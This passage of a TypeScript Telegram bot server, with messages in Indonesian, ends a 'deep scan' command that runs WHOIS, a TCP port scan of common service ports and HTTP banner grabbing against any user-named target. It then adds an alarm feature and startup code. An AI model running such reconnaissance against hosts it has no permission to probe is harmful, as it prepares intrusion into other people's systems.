            whoisInfo = `Registrar: ${whoisRaw.whois.registrar || '-'}\nCreated: ${whoisRaw.whois.creation_date || '-'}\nExpires: ${whoisRaw.whois.expiration_date || '-'}`;
        }
        
        // [3] REAL INTENSIVE PORT SCAN 
        const importantPorts = [21, 22, 23, 25, 53, 80, 110, 143, 443, 3306, 3389, 5432, 8080, 8443, 27017];
        let openPorts: number[] = [];
        
        const checkPort = (port: number) => {
          return new Promise<void>((resolve) => {
            const socket = new net.Socket();
            socket.setTimeout(1500);
            socket.on('connect', () => { openPorts.push(port); socket.destroy(); resolve(); });
            socket.on('timeout', () => { socket.destroy(); resolve(); });
            socket.on('error', () => { socket.destroy(); resolve(); });
            socket.connect(port, targetIp);
          });
        };
        
        await Promise.all(importantPorts.map(p => checkPort(p)));
        let portInfo = openPorts.length > 0 ? `Open Ports: ${openPorts.join(', ')}` : "All Top 15 Ports Filtered/Closed";

        // [4] HTTP BANNER GRABBING
        let bannerInfo = "HTTP Unreachable";
        try {
           const httpRes = await fetch(`http://${target}`, { redirect: 'manual', signal: AbortSignal.timeout(3000) });
           bannerInfo = `Server: ${httpRes.headers.get('server') || 'Hidden'}\nX-Powered-By: ${httpRes.headers.get('x-powered-by') || 'Hidden'}\nStatus: ${httpRes.status}`;
        } catch(e) {
           try {
              const httpsRes = await fetch(`https://${target}`, { redirect: 'manual', signal: AbortSignal.timeout(3000) });
              bannerInfo = `Server: ${httpsRes.headers.get('server') || 'Hidden'}\nStatus: ${httpsRes.status}`;
           } catch(e) {}
        }
        
        const finalTxt = `✅ <b>DEEP_SCAN_COMPLETED:</b> <code>${target}</code>\n` +
                         `━━━━━━━━━━━━━━━━━━━━\n` +
                         `🌍 <b>[GEO-IP OSINT]</b>\n${ipInfo}\n\n` +
                         `🛡️ <b>[WHOIS REGISTRY]</b>\n${whoisInfo}\n\n` +
                         `⚙️ <b>[TCP PORT SCAN]</b>\n${portInfo}\n\n` +
                         `🌐 <b>[WEB BANNER GRAB]</b>\n${bannerInfo}\n` +
                         `━━━━━━━━━━━━━━━━━━━━\n` +
                         `<i>* Intel Engine v2 - Powered by Extreme OSINT</i>`;
                         
        ctx.telegram.editMessageText(ctx.chat.id, scanMsg.message_id, undefined, finalTxt, { parse_mode: 'HTML' });

      } catch (err) {
        ctx.telegram.editMessageText(ctx.chat.id, scanMsg.message_id, undefined, `❌ <b>Error Occured:</b>\nTarget down atau protected.`, { parse_mode: 'HTML' });
      }
    });

    // ALARM SYSTEM
    const activeAlarms = new Map<number, any[]>();

    bot.command('alarm', (ctx) => {
      const args = ctx.message.text.split(' ')[1];
      if (!args) return ctx.reply("Format: /alarm [menit] atau /alarm [hh:mm]");

      let ms = 0;
      let label = "";

      if (args.includes(':')) {
        const [h, m] = args.split(':').map(Number);
        if (isNaN(h) || isNaN(m) || h < 0 || h > 23 || m < 0 || m > 59) {
          return ctx.reply("❌ Format jam salah. Gunakan HH:MM (0-23:0-59)");
        }
        const now = new Date();
        const target = new Date();
        target.setHours(h, m, 0, 0);
        if (target.getTime() <= now.getTime()) {
           target.setDate(target.getDate() + 1); // Besok
        }
        ms = target.getTime() - now.getTime();
        label = `${h.toString().padStart(2, '0')}:${m.toString().padStart(2, '0')}`;
      } else {
        const mins = parseInt(args);
        if (isNaN(mins) || mins <= 0) return ctx.reply("❌ Masukkan jumlah menit yang valid.");
        ms = mins * 60 * 1000;
        label = `${mins} menit lagi`;
      }

      if (ms > 24 * 60 * 60 * 1000 * 7) return ctx.reply("❌ Alarm maksimal 7 hari.");

      const alarmId = setTimeout(() => {
        ctx.reply(`⏰ <b>ALARM BUNYI!</b>\n━━━━━━━━━━━━━\nWaktu: ${label}`, { parse_mode: 'HTML' });
        const userAlarms = activeAlarms.get(ctx.from.id) || [];
        activeAlarms.set(ctx.from.id, userAlarms.filter(a => a.id !== alarmId));
      }, ms);

      const userAlarms = activeAlarms.get(ctx.from.id) || [];
      userAlarms.push({ id: alarmId, time: label, targetTime: Date.now() + ms });
      activeAlarms.set(ctx.from.id, userAlarms);

      ctx.reply(`✅ <b>Alarm diset!</b>\nSekitar: ${label}`, { parse_mode: 'HTML' });
    });

    bot.command('listalarm', (ctx) => {
      const userAlarms = activeAlarms.get(ctx.from.id) || [];
      if (userAlarms.length === 0) return ctx.reply("📭 Tidak ada alarm aktif.");

      let msg = `⏰ <b>ALARM AKTIF ANDA</b>\n━━━━━━━━━━━━━\n`;
      userAlarms.forEach((a, i) => {
        const remaining = Math.round((a.targetTime - Date.now()) / 60000);
        msg += `${i+1}. <b>${a.time}</b> (~${remaining} mnt lagi)\n`;
      });
      ctx.reply(msg, { parse_mode: 'HTML' });
    });

    process.once('SIGINT', () => bot && bot.stop('SIGINT'));
    process.once('SIGTERM', () => bot && bot.stop('SIGTERM'));
  } else {
    console.log("TELEGRAM_BOT_TOKEN not provided, skipping Telegram bot setup.");
  }

  const server = app.listen(PORT, "0.0.0.0", () => {
    console.log(`[${new Date().toISOString()}] SERVER ONLINE ON PORT ${PORT}`);
    console.log(`[${new Date().toISOString()}] HOST: ${appHost}`);

    // LAUNCH BOT ONLY AFTER SERVER IS LISTENING
    if (bot && token) {
      // Use Polling for better stability on Railway
      console.log(`[BOT] STARTING POLLING MODE...`);
      bot.launch({ dropPendingUpdates: true }).then(() => {
        console.log(`[BOT] ✅ BOT ONLINE (POLLING)`);
      }).catch(err => {
        if (err.code === 409) {
           console.warn(`[BOT] WARNING: Bot already running elsewhere. Links will still work but polling is limited.`);
        } else {
           console.error(`[BOT] ❌ LAUNCH ERROR:`, err.message);
        }
      });
    }
  });

  server.on('error', (err: any) => {
    console.error(`[${new Date().toISOString()}] CRITICAL SERVER ERROR:`, err);
    process.exit(1);
  });

  // Global uncaught exceptions handler
  process.on('uncaughtException', (err) => {
    console.error('[UNCAUGHT EXCEPTION]', err);
  });
  process.on('unhandledRejection', (reason, promise) => {
    console.error('[UNHANDLED REJECTION] at:', promise, 'reason:', reason);
  });
}

startServer().catch(err => {
  console.error("FATAL ERROR DURING STARTUP:", err);
  process.exit(1);
});
